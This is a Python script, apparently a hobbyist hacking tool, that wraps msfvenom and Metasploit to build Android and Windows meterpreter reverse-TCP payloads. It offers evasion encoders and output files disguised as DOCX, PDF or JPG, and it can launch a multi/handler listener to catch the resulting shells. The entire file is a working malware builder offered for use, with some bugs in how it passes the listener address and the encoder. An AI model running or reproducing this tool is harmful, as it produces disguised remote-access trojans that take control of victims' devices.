import os

# Function to generate payload
print(""" 
██╗░░██╗░█████╗░░█████╗░██╗░░░░░  ███╗░░░███╗░█████╗░░██████╗████████╗░█████╗░  ██████╗░███████╗██╗░░░██╗
██║░██╔╝██╔══██╗██╔══██╗██║░░░░░  ████╗░████║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗  ██╔══██╗██╔════╝██║░░░██║
█████═╝░███████║███████║██║░░░░░  ██╔████╔██║███████║╚█████╗░░░░██║░░░███████║  ██║░░██║█████╗░░╚██╗░██╔╝
██╔═██╗░██╔══██║██╔══██║██║░░░░░  ██║╚██╔╝██║██╔══██║░╚═══██╗░░░██║░░░██╔══██║  ██║░░██║██╔══╝░░░╚████╔╝░
██║░╚██╗██║░░██║██║░░██║███████╗  ██║░╚═╝░██║██║░░██║██████╔╝░░░██║░░░██║░░██║  ██████╔╝███████╗░░╚██╔╝░░
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝  ╚═════╝░╚══════╝░░░╚═╝░░░
""")
def generate_payload():
    print("[*] Available Systems:")
    print("[1] Android")
    print("[2] Windows")
    system_choice = input("Select system: ")

    if system_choice == "1":
        print("[*] Generating APK payload...")
        payload_type = input("[*] Select payload type (stage, non-stage, ): ")
        if payload_type == "stage":
            payload = "android/meterpreter/reverse_tcp"
        elif payload_type == "non-stage":
            payload = "android/meterpreter_reverse_tcp"
            payload += " LHOST={} LPORT={}".format(ip, port)
        else:
            payload = "android/meterpreter/reverse_tcp"
    elif system_choice == "2":
        print("[*] Generating EXE payload...")
        payload_type = input("[*] Select payload type (stage, non-stage, ): ")
        if payload_type == "stage":
            payload = "windows/meterpreter/reverse_tcp"
        elif payload_type == "non-stage":
            payload = "windows/meterpreter_reverse_tcp"
            payload += " LHOST={} LPORT={}".format(ip, port)
        else:
            payload = "windows/meterpreter/reverse_tcp"
    else:
        print("[!] Invalid option.")
        return

    # Encoding
    use_encoder = input("[*] Use encoder? (y/n): ")
    if use_encoder.lower() == "y":
        encoders = os.popen("sudo msfvenom -l encoders").read()
        print("[*] Available encoders:")
        print(encoders)
        encoder_choice = input("[*] Select encoder number: ")
        encoder = "-e {}".format(encoder_choice)
    else:
        encoder = ""

    # Output format
    print(""" -. -. `.  / .-' _.'  _
     .--`. `. `| / __.-- _' `
    '.-.  \  \ |  /   _.' `_
    .-. \  `  || |  .' _.-' `.
  .' _ \ '  -    -'  - ` _.-.
   .' `. %%%%%   | %%%%% _.-.`-
 .' .-. ><(@)> ) ( <(@)>< .-.`.
   (("`(   -   | |   -   )'"))
  / \\#)\    (.(_).)    /(#//\
 ' / ) ((  /   | |   \  )) (`.`.
 .'  (.) \ .md88o88bm. / (.) \)
   / /| / \ `Y88888Y' / \ | \ \
 .' / O  / `.   -   .' \  O \ \\
  / /(O)/ /| `.___.' | \\(O) \
   / / / / |  |   |  |\  \  \ \
   / / // /|  |   |  |  \  \ \  VK
 _.--/--/'( ) ) ( ) ) )`\-\-\-._
( ( ( ) ( ) ) ( ) ) ( ) ) ) ( ) )
""")
    print("[*] Available output formats:")
    print("[1] APK")
    print("[2] EXE")
    print("[3] DOCX")
    print("[4] PDF")
    print("[5] JPG")
    output_choice = input("Select output format: ")
    if output_choice == "1":
        output_format = "apk"
    elif output_choice == "2":
        output_format = "exe"
    elif output_choice == "3":
        output_format = "docx"
    elif output_choice == "4":
        output_format = "pdf"
    elif output_choice == "5":
        output_format = "jpg"
    else:
        print("[!] Invalid option.")
        return

    # Generate payload
    output_filename = input("Enter output filename (without extension): ")
    cmd = "sudo msfvenom -p {} {} -o {}.{}".format(payload, encoder, output_filename, output_format)
    os.system(cmd)

    print("[*] Payload generated successfully.")
    
    # Prompt user to start reverse multi handler in Metasploit
    start_handler = input("Start reverse multi handler in Metasploit? (y/n) ")

    if start_handler.lower() == "y":
        os.system(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {ip}; set LPORT {port}; exploit'")
    else:
        return

# Prompt user for IP and port
ip = input("Enter LHOST IP: ")
port = input("Enter LPORT: ")

# Main loop
while True:
    print("[*] Select option:")
    print("[1] Generate payload")
    print("[2] Exit")
    option = input("Enter option: ")

    if option == "1":
        generate_payload()
    elif option == "2":
        print("[*] Exiting program.")
        break
    else:
        print("[!] Invalid option. Try again.")

